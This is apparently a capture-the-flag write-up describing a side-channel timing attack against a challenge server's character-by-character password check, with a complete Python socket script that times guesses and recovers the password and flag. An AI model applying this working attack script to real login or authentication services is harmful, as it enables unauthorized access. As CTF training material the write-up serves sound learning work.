# Side-Channel Timing Attack Challenge

This repository contains a Python script that performs a side-channel timing attack to guess a dynamically generated 8-character hexadecimal password on a remote server. The goal is to exploit timing discrepancies in the server's password-checking logic to retrieve the correct password and gain access to a flag.

## Challenge Overview

In this challenge, we connect to a remote server that generates a random password each session. The server validates each guessed password character by character and introduces a delay for each correct character in the guess. This timing feedback allows us to determine partial correctness of each guess, making it possible to deduce the password character by character using timing analysis.

- **Server Address**: `challenge.ctf.games`
- **Server Port**: `30914`
- **Password Format**: 8 characters, hexadecimal (`0-9` and `a-f`)
- **Password Validity**: Dynamic, changes every session

## Attack Strategy

The script leverages a **side-channel timing attack**, which exploits timing variations in the server's response to infer the correct characters of the password. Here’s a step-by-step outline of the approach:

1. **Measure Timing Feedback**: Each character of the password is validated individually, with correct characters causing a small delay in the response time. By measuring the time it takes for the server to respond to each guess, we can infer when a guessed character matches the correct password character.

2. **Persistent Connection**: The connection to the server remains open throughout the guessing process, allowing us to send multiple guesses without re-establishing the connection each time. This persistence makes the timing attack more efficient.

3. **Build Password Incrementally**: For each position in the password, we test all possible hexadecimal characters (`0-9`, `a-f`) and measure the response time. We choose the character with the longest response time for each position, as it likely matches the actual password character.

## Solution Script

The script below performs the timing attack to deduce the password.

```python
import socket
import time
import string

# Connection details
HOST = 'challenge.ctf.games'
PORT = 30914

# Password guess settings
hex_chars = "0123456789abcdef"
password = ""

def connect_and_guess(sock, guess):
    # Send guess to the server
    sock.sendall(f"{guess}\n".encode())
    start_time = time.time()
    
    # Read response from server
    response = sock.recv(1024).decode()
    elapsed_time = time.time() - start_time
    return elapsed_time, response

def guess_password():
    global password
    
    # Connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((HOST, PORT))
        print("Connection established. Starting password guess...")
        
        # Read initial welcome message from server
        print(sock.recv(1024).decode())
        
        for i in range(8):  # Password length is 8 characters
            times = {}
            
            # Test each character in hex_chars at the current position
            for char in hex_chars:
                guess = password + char + "0" * (7 - i)
                elapsed_time, response = connect_and_guess(sock, guess)
                times[char] = elapsed_time
                
                # Display current progress and timing info
                print(f"Trying '{guess}' - Elapsed time: {elapsed_time:.4f}s")
                
                if "flag" in response:  # Check if the flag has been returned
                    print(f"Password found: {guess}")
                    print(response)
                    return
            
            # Select the character with the longest elapsed time
            best_char = max(times, key=times.get)
            password += best_char
            print(f"Character {i+1} guessed: {best_char} (Partial password: {password})\n")

        print(f"Guessed password: {password}")
        
        # Final submission after guessing the password
        final_time, final_response = connect_and_guess(sock, password)
        print("Final response:", final_response)

guess_password()
